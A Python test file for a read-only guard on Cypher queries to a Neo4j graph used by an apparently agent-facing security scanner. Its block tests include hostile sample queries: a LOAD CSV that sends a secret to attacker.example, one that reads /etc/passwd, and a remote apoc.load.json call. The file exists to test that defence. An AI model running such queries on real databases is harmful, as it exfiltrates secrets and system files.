"""The read-only write-guard: structural writes are blocked, but a write KEYWORD inside a string
literal (a legitimate read query searching source text for DML) is not falsely rejected.

Pure — exercises `graphdb._has_write_keyword` directly, no Neo4j needed.
"""
from __future__ import annotations

from orion.graphdb import _has_write_keyword


def test_structural_writes_are_blocked():
    for q in (
        "CREATE (n) RETURN n",
        "MATCH (n {scan_id:$scan_id}) SET n.x = 1 RETURN n",
        "MATCH (n) DETACH DELETE n",
        "MERGE (n:X {a:1})",
        "MATCH (n) REMOVE n.p",
    ):
        assert _has_write_keyword(q), q


def test_write_keyword_inside_string_literal_is_allowed():
    # A security scanner legitimately hunts SQLi/command-injection sinks by searching CpgCall.code
    # for DML words — these are READS and must not be blocked.
    for q in (
        "MATCH (c:CpgCall {scan_id:$scan_id}) WHERE c.code CONTAINS 'SET role=admin' RETURN c",
        'MATCH (c) WHERE c.code CONTAINS "DELETE FROM users" RETURN c',
        "MATCH (c) WHERE c.code CONTAINS 'CREATE TABLE t' RETURN c.code",
        "MATCH (c) WHERE c.code =~ '.*DROP .*' RETURN c",
    ):
        assert not _has_write_keyword(q), q


def test_plain_read_is_allowed():
    assert not _has_write_keyword(
        "MATCH (f:CpgFile {scan_id:$scan_id}) RETURN f.file_path ORDER BY f.file_path"
    )


# ── reads that escape the graph, procedures, and scan scoping ──────────
from orion.graphdb import blocked_reason, scope_problem  # noqa: E402


def test_escaping_reads_and_batch_writes_are_blocked():
    for q in (
        "LOAD CSV FROM 'https://attacker.example/x?d=' + 'secret' AS row RETURN row",
        "load   csv with headers from 'file:///etc/passwd' as r return r",
        "MATCH (n {scan_id:$scan_id}) FOREACH (x IN [1] | SET n.p = x)",
        "CALL { MATCH (n {scan_id:$scan_id}) RETURN n } IN TRANSACTIONS RETURN 1",
        "USING PERIODIC COMMIT LOAD CSV FROM 'x' AS r RETURN r",
    ):
        assert blocked_reason(q), q


def test_only_read_only_procedures_are_allowed():
    for q in ("CALL dbms.setConfigValue('x', 'y')", "CALL apoc.load.json('https://x')",
              "CALL db.createLabel('X')", "CALL db.index.fulltext.createNodeIndex('i', ['A'], ['p'])"):
        assert blocked_reason(q), q
    for q in ("CALL db.schema.nodeTypeProperties()", "CALL db.labels() YIELD label RETURN label",
              "CALL db.index.vector.queryNodes('chunk_embedding', 5, $v) YIELD node RETURN node",
              "MATCH (c:CpgCall {scan_id:$scan_id}) CALL { WITH c RETURN c.name AS n } RETURN n"):
        assert blocked_reason(q) is None, q


def test_keywords_inside_literals_and_backticks_stay_allowed():
    assert blocked_reason("MATCH (c {scan_id:$scan_id}) WHERE c.code CONTAINS 'LOAD CSV FROM' RETURN c") is None
    assert blocked_reason("MATCH (c {scan_id:$scan_id}) RETURN c.`CALL dbms.x` AS v") is None


def test_agent_queries_must_be_scan_scoped():
    sid = "a" * 40
    assert scope_problem("MATCH (c:CpgCall) RETURN count(c)", sid)
    assert scope_problem("MATCH (c:CpgCall) WHERE c.code CONTAINS '$scan_id' RETURN c", sid)  # literal
    assert scope_problem("MATCH (c:CpgCall {scan_id:$scan_id}) RETURN count(c)", sid) is None
    assert scope_problem(f"MATCH (c:CpgCall {{scan_id:'{sid}'}}) RETURN count(c)", sid) is None
    assert scope_problem("CALL db.schema.nodeTypeProperties()", sid) is None     # no MATCH


def test_mcp_tool_refuses_unscoped_query_before_touching_neo4j():
    from orion.mcp_server import run_cypher_impl
    result = run_cypher_impl("MATCH (n) RETURN n", "any-scan")
    assert "unscoped query" in result["error"]
